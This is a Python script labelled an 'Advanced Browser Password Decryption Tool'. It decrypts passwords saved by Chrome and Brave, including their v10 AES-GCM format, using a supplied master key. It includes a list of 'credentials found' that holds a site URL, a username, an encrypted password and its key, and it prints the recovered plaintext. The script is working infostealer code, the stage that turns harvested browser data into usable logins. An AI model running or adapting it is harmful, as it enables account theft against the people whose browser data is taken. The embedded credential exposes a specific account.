from Cryptodome.Cipher import AES
import base64
import sys
import json

def decrypt_password(key, encrypted_password):
    try:
        # Decode the key and encrypted password from base64
        key = base64.b64decode(key)
        encrypted_bytes = base64.b64decode(encrypted_password)
        
        # Check for the v10 format (common in newer Chrome/Brave versions)
        if len(encrypted_bytes) > 3 and encrypted_bytes[:3] == b'v10':
            # Chrome/Brave v10 format: 
            # v10 prefix (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
            nonce = encrypted_bytes[3:15]
            ciphertext = encrypted_bytes[15:-16]
            tag = encrypted_bytes[-16:]
            
            # Create cipher and decrypt
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            try:
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8')
            except ValueError as mac_error:
                # If MAC check fails, try alternate format
                if "MAC check failed" in str(mac_error):
                    # Some versions may have different byte arrangements
                    # Try with adjusted offsets
                    for offset in range(1, 5):
                        try:
                            alt_nonce = encrypted_bytes[3:15+offset]
                            alt_ciphertext = encrypted_bytes[15+offset:-16]
                            alt_tag = encrypted_bytes[-16:]
                            
                            alt_cipher = AES.new(key, AES.MODE_GCM, nonce=alt_nonce)
                            decrypted = alt_cipher.decrypt_and_verify(alt_ciphertext, alt_tag)
                            return decrypted.decode('utf-8')
                        except:
                            pass
                return f"[Decryption Error: MAC verification failed]"
        
        # Try older Chrome format (v80) without prefix
        else:
            # Try older Chrome format (no prefix, just nonce + ciphertext + tag)
            try:
                # Attempt with 12-byte nonce
                nonce = encrypted_bytes[:12]
                ciphertext = encrypted_bytes[12:-16]
                tag = encrypted_bytes[-16:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8')
            except:
                pass
        
        # If all decryption attempts failed
        return "[Decryption Error: Unknown format]"
    
    except Exception as e:
        return f"[Decryption Error: {str(e)}]"

# List of credentials found with their associated keys
credentials = [    {
        "browser": "chrome",
        "profile": "Default",
        "url": "https://alokty.com/",
        "username": "alokkk",
        "encrypted_password": "djEw+doh/aH9HcaGzrM9pLAqQa0PEY2TC+hqrMYRZ3aPlDM=",
        "key": "CFssVjKGEsbJQfZ8Fwk4kHd4m6p+co0Ieez1CRW6ZVc="
    },]

print("Advanced Browser Password Decryption Tool")
print("=========================================")

success_count = 0
failure_count = 0

# Group by browser and profile for better organization
browser_profile_groups = {}

for cred in credentials:
    browser = cred["browser"]
    profile = cred["profile"]
    group_key = f"{browser} - {profile}"
    
    if group_key not in browser_profile_groups:
        browser_profile_groups[group_key] = []
    
    browser_profile_groups[group_key].append(cred)

# Process each browser/profile group
for group_name, creds in browser_profile_groups.items():
    print(f"\n{group_name}:")
    print("-" * len(group_name) + "-")
    
    for cred in creds:
        url = cred["url"]
        username = cred["username"]
        encrypted_password = cred["encrypted_password"]
        key = cred["key"]
        
        # Use the key associated with this specific credential
        decrypted_password = decrypt_password(key, encrypted_password)
        
        # Count success/failure
        if decrypted_password.startswith("[Decryption Error:"):
            failure_count += 1
        else:
            success_count += 1
        
        # Print credential information
        print(f"URL: {url}")
        print(f"Username: {username}")
        print(f"Password: {decrypted_password}")
        print("---------------------------")

print(f"\nDecryption Summary:")
print(f"Successfully decrypted: {success_count}")
print(f"Failed to decrypt: {failure_count}")
print(f"Total credentials: {len(credentials)}")